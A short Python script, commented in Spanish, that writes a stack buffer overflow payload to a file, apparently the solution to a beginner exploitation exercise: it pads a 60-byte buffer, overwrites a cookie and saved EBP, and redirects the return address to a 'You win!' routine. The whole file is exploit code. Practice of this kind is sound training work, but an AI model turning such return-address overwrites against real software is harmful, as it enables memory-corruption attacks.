from struct import pack

exploit = b'A'*60 # Llenar el buf
exploit += b'BBBB' # Llenar la cookie
exploit += b'CCCC' # Llenar el ebp
exploit += pack('<I', 0x0804845a) # Retornar hacia el address del printf("You win!")
exploit += b'A'*8
exploit += b'DCBA'

f = open('crack_01_03.txt', 'wb')
f.write(exploit)
f.close()